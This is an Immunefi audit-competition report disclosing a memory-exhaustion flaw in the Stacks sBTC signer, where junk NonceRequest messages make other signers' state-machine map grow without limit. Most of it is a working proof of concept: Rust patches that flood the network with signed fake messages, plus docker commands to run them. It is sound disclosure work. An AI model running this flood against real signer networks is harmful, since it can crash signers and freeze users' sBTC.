# #38270 \[BC-Medium] A signer can send a large number of junk \`WstsNetMessage::NonceRequest\` through P

**Submitted on Dec 29th 2024 at 18:28:23 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38270
* **Report Type:** Blockchain/DLT
* **Report severity:** Medium
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Permanent freezing of funds (fix requires hardfork)
  * API crash preventing correct processing of deposits

## Description

## Brief/Intro

Each time a signer receives a `WstsNetMessage::NonceRequest` message, it inserts the `msg.txid` into the `wsts_state_machines`. Then a malicious signer can send a large number of junk `WstsNetMessage::NonceRequest` messages to other signers to make the `wsts_state_machines` of other signers grow indefinitely, causing them to run out of memory.

## Vulnerability Details

The `signer/src/transaction_signer.rs::handle_wsts_message` function is as follows.

```rust
            WstsNetMessage::NonceRequest(request) => {
                tracing::info!("handling NonceRequest");
                if !chain_tip_report.sender_is_coordinator {
                    tracing::warn!("received coordinator message from non-coordinator signer");
                    return Ok(());
                }

                let db = self.context.get_storage();
                let sig_hash = &request.message;
                let validation_outcome = Self::validate_bitcoin_sign_request(&db, sig_hash).await;

                let validation_status = match &validation_outcome {
                    Ok(()) => "success",
                    Err(Error::SigHashConversion(_)) => "improper-sighash",
                    Err(Error::UnknownSigHash(_)) => "unknown-sighash",
                    Err(Error::InvalidSigHash(_)) => "invalid-sighash",
                    Err(_) => "unexpected-failure",
                };

                metrics::counter!(
                    Metrics::SignRequestsTotal,
                    "blockchain" => BITCOIN_BLOCKCHAIN,
                    "kind" => "sweep",
                    "status" => validation_status,
                )
                .increment(1);

                if !self.wsts_state_machines.contains_key(&msg.txid) {
                    let (maybe_aggregate_key, _) = self
                        .get_signer_set_and_aggregate_key(bitcoin_chain_tip)
                        .await?;

                    let state_machine = SignerStateMachine::load(
                        &db,
                        maybe_aggregate_key.ok_or(Error::NoDkgShares)?,
                        self.threshold,
                        self.signer_private_key,
                    )
                    .await?;

                    self.wsts_state_machines.insert(msg.txid, state_machine);
                }
                self.relay_message(msg.txid, &msg.inner, bitcoin_chain_tip)
                    .await?;
            }
```

As long as `msg.txid` is not contained in `self.wsts_state_machines`, this function will insert `msg.txid` into `self.wsts_state_machines`. Then, the attacker can send a large number of messages with different `txid` to make the `self.wsts_state_machines` of other signers grow infinitely.

## Impact Details

It can cause signers to crash due to out of memory, which will cause signers to be unable to process deposits and withdrawls. The user's sBTC is frozen until signers manually process withdrawls.

It requires the attacker to be one of the signers, so I believe it is **Medium**.

## References

None

## Proof of Concept

## Proof of Concept

1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
2. Patch `signer/src/config/mod.rs`, add attacker tag config

   ```diff
        /// The minimum bitcoin block height for which the sbtc signers will
        /// backfill bitcoin blocks to.
        pub sbtc_bitcoin_start_height: Option<u64>,
   +    /// @audit;
   +    pub audit_this_signer_is_attacker: Option<bool>,
    }
    
    impl Validatable for SignerConfig {
   ```
3. Patch `signer/src/main.rs`, load attacker tag

   ```diff
        );
    
        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config)?;
   +    let mut settings = Settings::new(args.config)?;
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
    
        // Open a connection to the signer db.
   ```
4. Patch `docker/docker-compose.yml`, add attacker tag

   ```diff
          - postgres-3
        environment:
          <<: *sbtc-signer-environment
   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   ```
5. Patch `signer/src/network/libp2p/event_loop.rs`, add attack action

   ```diff
            }
        };
    
   +    let attacker = async {
   +        // waiting for sBTC contract deployment
   +        loop {
   +            tokio::time::sleep(Duration::from_secs(10)).await;
   +            let contract = crate::stacks::contracts::SMART_CONTRACTS[0];
   +            let stacks_client = ctx.get_stacks_client();
   +            let deployed = contract.is_deployed(&stacks_client, &ctx.config().signer.deployer).await;
   +            if deployed.is_ok_and(|x| x) {
   +                break;
   +            }
   +        }
   +
   +        let is_attacker = ctx.config().signer.audit_this_signer_is_attacker.is_some_and(|x| x);
   +        loop {
   +            tokio::time::sleep(Duration::from_secs(2)).await;
   +            if !is_attacker { // sleep forever if the signer is not an attacker
   +                tokio::time::sleep(Duration::from_secs(std::u64::MAX)).await;
   +            } else {
   +                let res = attack_3(ctx).await;
   +                tracing::info!("@audit; attack res: {:?}", res);
   +            }
   +        }
   +    };
    
        tokio::select! {
            _ = term.wait_for_shutdown() => {
                tracing::info!("libp2p received a termination signal; stopping the libp2p swarm");
            },
            _ = poll_outbound => {},
            _ = poll_swarm => {},
            _ = log => {},
   +        _ = attacker => {},
        }
    
        tracing::info!("libp2p event loop terminated");
    }
    
   +static mut INDEX: i32 = 0;
   +async fn attack_3(ctx: &impl Context) -> Result<(), Error> {
   +    use crate::ecdsa::SignEcdsa;
   +    use crate::keys::PublicKey;
   +    use crate::message::Payload;
   +    use crate::network::{ MessageTransfer, P2PNetwork };
   +    use crate::storage::DbRead;
   +    use std::collections::BTreeSet;
   +
   +    let db = ctx.get_storage();
   +    let bitcoin_chain_tip = db.get_bitcoin_canonical_chain_tip()
   +        .await?
   +        .ok_or(Error::NoChainTip)?;
   +
   +    let signer_set: BTreeSet<PublicKey> = match db.get_last_key_rotation(&bitcoin_chain_tip).await? {
   +        Some(last_key) => {
   +            last_key.signer_set.into_iter().collect()
   +        }
   +        _ => {
   +            return Err(Error::BitcoinCoreZmqConnectTimeout("no signer_set".to_string()));
   +        }
   +    };
   +
   +    let private_key = ctx.config().clone().signer.private_key;
   +    if !crate::transaction_coordinator::given_key_is_coordinator(
   +        PublicKey::from_private_key(&private_key),
   +        &bitcoin_chain_tip,
   +        &signer_set,
   +    ) {
   +        return Err(Error::BitcoinCoreZmqConnectTimeout("not coordinator".to_string()));
   +    }
   +
   +    let mut fake_bitcoin_tx = bitcoin::Transaction {
   +        version: bitcoin::transaction::Version::non_standard(0),
   +        lock_time: bitcoin::absolute::LockTime::ZERO,
   +        input: vec![],
   +        output: vec![],
   +    };
   +
   +    let mut network = P2PNetwork::new(ctx);
   +    for _ in 0..1000 {
   +        // Make each `msg.txid` different
   +        unsafe {
   +            fake_bitcoin_tx.version = bitcoin::transaction::Version::non_standard(INDEX);
   +            INDEX += 1;
   +        }
   +
   +        let signer_withdrawal_decision = crate::message::WstsMessage {
   +            txid: fake_bitcoin_tx.compute_txid(),
   +            inner: wsts::net::Message::NonceRequest(wsts::net::NonceRequest {
   +                dkg_id: 0,
   +                sign_id: 0,
   +                sign_iter_id: 0,
   +                message: vec![],
   +                signature_type: wsts::net::SignatureType::Frost,
   +            }),
   +        };
   +
   +        network.broadcast(
   +            Payload::from(signer_withdrawal_decision)
   +                .to_message(bitcoin_chain_tip)
   +                .sign_ecdsa(&private_key)
   +        ).await?;
   +    }
   +
   +    Ok(())
   +}
   +
    #[tracing::instrument(skip_all, name = "kademlia")]
    fn handle_kademlia_event(event: kad::Event) {
        match event {
   ```
6. Patch `signer/src/transaction_signer.rs`, add some log

   ```diff
                #[allow(clippy::map_entry)]
                WstsNetMessage::NonceRequest(request) => {
                    tracing::info!("handling NonceRequest");
                    if !chain_tip_report.sender_is_coordinator {
                        tracing::warn!("received coordinator message from non-coordinator signer");
   +                    tracing::info!("@audit; non-coordinator signer");
                        return Ok(());
                    }
    
                    let db = self.context.get_storage();
                    let sig_hash = &request.message;
                    let validation_outcome = Self::validate_bitcoin_sign_request(&db, sig_hash).await;
                    let validation_status = match &validation_outcome {
                        Ok(()) => "success",
                        Err(Error::SigHashConversion(_)) => "improper-sighash",
                        Err(Error::UnknownSigHash(_)) => "unknown-sighash",
                        Err(Error::InvalidSigHash(_)) => "invalid-sighash",
                        Err(_) => "unexpected-failure",
                    };
                    metrics::counter!(
                        Metrics::SignRequestsTotal,
                        "blockchain" => BITCOIN_BLOCKCHAIN,
                        "kind" => "sweep",
                        "status" => validation_status,
                    )
                    .increment(1);
    
   +                tracing::info!("@audit; contains_key: {:?}, wsts_state_machines, len: {:?}",
   +                    self.wsts_state_machines.contains_key(&msg.txid),
   +                    self.wsts_state_machines.len()
   +                );
                    if !self.wsts_state_machines.contains_key(&msg.txid) {
                        let (maybe_aggregate_key, _) = self
                            .get_signer_set_and_aggregate_key(bitcoin_chain_tip)
   ```
7. Run docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
8. This PoC sets *sbtc-signer-3* as an attacker, which will automatically attack other signers. Observe the log and you will find that `self.wsts_state_machines` of other signers keeps growing
9. You can observe the memory usage of signer through `docker stats sbtc-signer-1` command
